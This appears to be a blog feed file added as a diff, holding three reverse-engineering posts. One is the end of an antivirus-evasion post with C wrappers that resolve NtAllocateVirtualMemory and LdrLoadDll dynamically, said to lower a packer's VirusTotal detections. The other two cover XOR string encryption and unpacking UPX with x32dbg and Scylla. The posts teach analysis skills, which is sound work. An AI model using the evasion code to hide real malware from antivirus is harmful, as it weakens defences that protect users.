+	<span class="n">pRtlInitUnicodeString</span> <span class="n">RtlInitUnicodeString</span> <span class="o">=</span> <span class="p">(</span><span class="n">pRtlInitUnicodeString</span><span class="p">)</span><span class="n">myGetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span> <span class="s">"RtlInitUnicodeString"</span><span class="p">);</span>
+
+	<span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ustrModule</span><span class="p">,</span> <span class="n">lpFileName</span><span class="p">);</span>
+
+	<span class="n">pLdrLoadDll</span> <span class="n">myLdrLoadDll</span> <span class="o">=</span> <span class="p">(</span><span class="n">pLdrLoadDll</span><span class="p">)</span><span class="n">myGetProcAddress</span><span class="p">(</span><span class="n">myGetModuleHandle</span><span class="p">(</span><span class="s">L"ntdll.dll"</span><span class="p">),</span> <span class="s">"LdrLoadDll"</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">myLdrLoadDll</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">myLdrLoadDll</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ustrModule</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hModule</span><span class="p">);</span>
+	<span class="k">return</span> <span class="p">(</span><span class="n">HMODULE</span><span class="p">)</span><span class="n">hModule</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Custom <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">pNtAllocateVirtualMemory</span><span class="p">)(</span>
+	<span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
+	<span class="n">PVOID</span><span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span>
+	<span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
+	<span class="n">PSIZE_T</span> <span class="n">RegionSize</span><span class="p">,</span>
+	<span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
+	<span class="n">ULONG</span> <span class="n">Protect</span>
+	<span class="p">);</span>
+
+<span class="n">LPVOID</span> <span class="nf">myVirtualAlloc</span><span class="p">(</span><span class="n">SIZE_T</span> <span class="n">size</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">allocationType</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">protect</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">myGetModuleHandle</span><span class="p">((</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="s">L"ntdll.dll"</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ntdll</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Failed to get address of NtAllocateVirtualMemory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">pNtAllocateVirtualMemory</span> <span class="n">myAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtAllocateVirtualMemory</span><span class="p">)</span><span class="n">myGetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">myAllocateVirtualMemory</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Failed to get address of NtAllocateVirtualMemory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">PVOID</span> <span class="n">baseAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">SIZE_T</span> <span class="n">regionSize</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+
+	<span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">myAllocateVirtualMemory</span><span class="p">(</span>
+		<span class="n">GetCurrentProcess</span><span class="p">(),</span>
+		<span class="o">&amp;</span><span class="n">baseAddress</span><span class="p">,</span>
+		<span class="mi">0</span><span class="p">,</span>
+		<span class="o">&amp;</span><span class="n">regionSize</span><span class="p">,</span>
+		<span class="n">allocationType</span><span class="p">,</span>
+		<span class="n">protect</span>
+	<span class="p">);</span>
+	<span class="k">return</span> <span class="n">baseAddress</span><span class="p">;</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Combined with some other tricks, these custom functions reduced the detections of my packer to around <strong>5 detections</strong> on VirusTotal:</p>
+
+<p><img src="/assets/images/evadingavs/customfunctions/detections.png" alt="Direct WinAPI function usage" /></p>
+
+<p>Before the custom functions, my packer was at around <strong>19 detections</strong>.</p>]]></content><author><name>Alon Alush</name></author><category term="AV-evasion" /><summary type="html"><![CDATA[Learn how malware bypassses AV evasion (includes code examples)]]></summary></entry><entry><title type="html">Explaining encrypted strings in .exe files</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/encryptedstrings/" rel="alternate" type="text/html" title="Explaining encrypted strings in .exe files" /><published>2025-04-18T00:00:00+00:00</published><updated>2025-04-18T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/encryptedstrings</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/encryptedstrings/"><![CDATA[<h1 id="encrypted-strings">Encrypted strings</h1>
+
+<p>Have you ever tried solving a crackme, only to be baffled as to why the strings like <code class="language-plaintext highlighter-rouge">"Wrong Password!</code> don’t appear in x64dbg’s string references search?</p>
+
+<p>The answer is simple: <strong>String encryption</strong>.</p>
+
+<p>When you search for string references in x64dbg, it looks for recognizable ASCII sequences <strong>in the static file</strong> (the <code class="language-plaintext highlighter-rouge">.exe</code> as it sits on disk).</p>
+
+<p>This works for programs that store their strings as raw text, like this:</p>
+
+<p><img src="/assets/images/unpacking/encryptedstrings/demo.png" alt="ASCII representation on disk" /></p>
+
+<p>The corresponding hexadecimal for <code class="language-plaintext highlighter-rouge">"Hello, World!"</code> would look like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 65 6C 6C 6F 2C 20 57 6F 72 6C 64 21
+</code></pre></div></div>
+
+<p>However, real-world programs (and many crackmes) often don’t store strings like that. Instead, they <strong>encrypt</strong> the strings — so the actual file on disk doesn’t contain <code class="language-plaintext highlighter-rouge">"Hello, World!"</code>, but some meaningless-looking bytes, like this:</p>
+
+<p><img src="/assets/images/unpacking/encryptedstrings/demo1.png" alt="Encrypted representation on disk" /></p>
+
+<p>One of the most common methods used in crackmes is <strong>XOR encryption</strong>.<br />
+Here’s a basic C example to show how it works:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">decrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">output</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">encrypted</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">output</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">encrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">output</span><span class="p">[</span><span class="n">length</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="c1">// Null-terminate</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// XOR encrypted version of "Hello, World!" with key 0xAA</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">encrypted</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0x8B</span>
+    <span class="p">};</span>
+    <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">encrypted</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span> <span class="o">=</span> <span class="mh">0xAA</span><span class="p">;</span>
+
+    <span class="kt">char</span> <span class="n">decrypted</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="n">decrypt</span><span class="p">(</span><span class="n">decrypted</span><span class="p">,</span> <span class="n">encrypted</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Decrypted string: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Instead of writing:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>char string[] = "Hello, World!";
+</code></pre></div></div>
+<p>the program stores an encrypted version of the string:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">encrypted</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0x8B</span>
+    <span class="p">};</span>
+</code></pre></div></div>
+<p>At runtime, the program decrypts it back before using it.
+Here’s how the encrypted bytes look on disk:</p>
+
+<p><img src="/assets/images/unpacking/encryptedstrings/demo1.png" alt="Encrypted representation on disk" /></p>
+
+<p>Hex representation:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>E2 CF C6 C6 C5 86 EA C5 D8 C6 C5 CE 8B
+</code></pre></div></div>
+
+<p>Hopefully, you now understand <strong>why x64dbg misses those strings in search</strong>: They are simply encrypted.</p>
+
+<p>In the next chapter, <strong>we’ll explain how to find the decryption routines without having to rely on a simple string search</strong>.</p>
+
+<p>Stay tuned!</p>]]></content><author><name>Alon Alush</name></author><category term="Unpacking" /><summary type="html"><![CDATA[Simple explanation on encryped strings in .exe files, and how to get around them when solving crackmes]]></summary></entry><entry><title type="html">Unpacking UPX (MinGW example)</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/unpackingupx/" rel="alternate" type="text/html" title="Unpacking UPX (MinGW example)" /><published>2025-04-18T00:00:00+00:00</published><updated>2025-04-18T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/unpackingupx</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/unpackingupx/"><![CDATA[<h1 id="unpacking-upx">Unpacking UPX</h1>
+
+<p>In this project, we’ll explore how to modify the strings (text) of executable files. When we run an executable file, strings like “Hello World!” that appear on the GUI are usually located in the <code class="language-plaintext highlighter-rouge">rdata</code> or <code class="language-plaintext highlighter-rouge">.data</code> segments. These are parts of the PE file structure used by the program to hold constant values like string literals.</p>
+
+<p>Below is an example of these data segments shown in the program <code class="language-plaintext highlighter-rouge">CFF Explorer</code>, for my crackme <code class="language-plaintext highlighter-rouge">LSDtrip.exe</code>:
+<img src="/assets/images/unpacking/MinGW/demo.png" alt="Data segments in CFF Explorer showing the .rdata and .data sections" /></p>
+
+<p>As you can see, it indeed contains the strings of the program:</p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo18.png" alt="Modifying strings in a hex editor" />
+ In these kinds of executables, where the string are statically stored in the binary, we can simply load them up in a
+Hex editor like <code class="language-plaintext highlighter-rouge">HxD</code> and modify these values:</p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo2.png" alt="Modifying strings in a hex editor" /></p>
+
+<h1 id="the-unpacking-process">The unpacking process</h1>
+
+<p>The main problem is that, in most commercial programs, this won’t be as straightforward. Programs often don’t store the string “as-is” in the binary. Instead, they use a process called “packing”, where static variables are encrypted within the binary. At runtime, these encrypted strings are unpacked through a loop of assembly instructions, then loaded into memory and displayed in the GUI. This means that, in the executable binary, instead of seeing <code class="language-plaintext highlighter-rouge">"Hello World"</code>, you’ll see something like `+@#4$g9j&amp;f7%$l%5.</p>
+
+<p>To modify these strings, we need to “unpack” the program. This means saving the executable code at a memory state where the program has already decrypted all the static string variables. This way, all the decrypted strings will be contained within our .exe file, and we could then easily change them.</p>
+
+<p>For this process, we will use a debugger called <code class="language-plaintext highlighter-rouge">x32dbg</code> and its built-in plugin for dumping, <code class="language-plaintext highlighter-rouge">Scylla</code>.</p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo6.png" alt="Debugger showing pushad instruction" />
+We will unpack an example UPX-packed <code class="language-plaintext highlighter-rouge">MinGW</code> executable. First, we open it in <code class="language-plaintext highlighter-rouge">x32dbg</code>, and click F9 until we reach the <code class="language-plaintext highlighter-rouge">pushad</code> instruction. Then, we’ll press <code class="language-plaintext highlighter-rouge">Ctrl + F</code> to search for the assembly instruction <code class="language-plaintext highlighter-rouge">popad</code> and locate it in the code:</p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo7.png" alt="Searching for popad instruction" /></p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo8.png" alt="Searching for popad instruction" /></p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo9.png" alt="Searching for popad instruction" /></p>
+
+<p>Then, we set a breakpoint at the nearest <code class="language-plaintext highlighter-rouge">jmp</code> instruction to <code class="language-plaintext highlighter-rouge">popad</code>. In this case, it’s <code class="language-plaintext highlighter-rouge">jmp 0x00401580</code>. We’ll set a breakpoint on this address, and then we’ll press <code class="language-plaintext highlighter-rouge">F7</code> (Step Over).</p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo10.png" alt="Nearest jmp instruction" /></p>
+
+<p>As you can see, the instruction <code class="language-plaintext highlighter-rouge">jmp 0x00401580</code> takes us to <code class="language-plaintext highlighter-rouge">push ebp</code>. This is the <code class="language-plaintext highlighter-rouge">OEP (Original Entry Point)</code> of the program, meaning it’s at this instruction where the program finished unpacking itself and is ready for the actual intended code execution after unpacking.
+<img src="/assets/images/unpacking/MinGW/demo11.png" alt="Setting breakpoint and stepping over" /></p>
+
+<p>Now, we will open the plugin <code class="language-plaintext highlighter-rouge">Scylla</code> in <code class="language-plaintext highlighter-rouge">x32dbg</code>. We specify the OEP address, which is the instruction <code class="language-plaintext highlighter-rouge">push ebp</code>, address <code class="language-plaintext highlighter-rouge">00401580</code>. Now, we’ll click <code class="language-plaintext highlighter-rouge">IAT Autosearch</code> and <code class="language-plaintext highlighter-rouge">Get Imports</code>:
+<img src="/assets/images/unpacking/MinGW/demo5.png" alt="Using Scylla to get imports" /></p>
+
+<p>Next, we click <code class="language-plaintext highlighter-rouge">Dump</code> to save the unpacked executable:</p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo14.png" alt="Dumping the unpacked executable" /></p>
+
+<h1 id="fixing-the-imports">Fixing the imports</h1>
+
+<p>The file is saved as <code class="language-plaintext highlighter-rouge">dump.exe</code>. However, when we attempt to open it, an error message appears:</p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo13.png" alt="Error message when opening dump.exe" /></p>
+
+<p>This error occurs because the imports are corrupted. To fix this, we return to Scylla, click <code class="language-plaintext highlighter-rouge">Fix Dump</code>, and select our dumped file, <code class="language-plaintext highlighter-rouge">dump.exe</code>:
+<img src="/assets/images/unpacking/MinGW/demo15.png" alt="Fixing the dumped executable with Scylla" /></p>
+
+<p>After fixing the imports, we have a working unpacked executable that we can modify, <code class="language-plaintext highlighter-rouge">dumped_SCY.exe</code></p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo16.png" alt="Successfully running dumped_SCY.exe" /></p>
+
+<p>Now, we can open the unpacked <code class="language-plaintext highlighter-rouge">dumped_SCY.exe</code> with HxD and modify the strings as needed:</p>
+
+<p><img src="/assets/images/unpacking/MinGW/demo17.png" alt="Modifying strings in HxD" /></p>]]></content><author><name>Alon Alush</name></author><category term="Unpacking" /><summary type="html"><![CDATA[Simple example on how to modify UPX-packed files]]></summary></entry></feed>
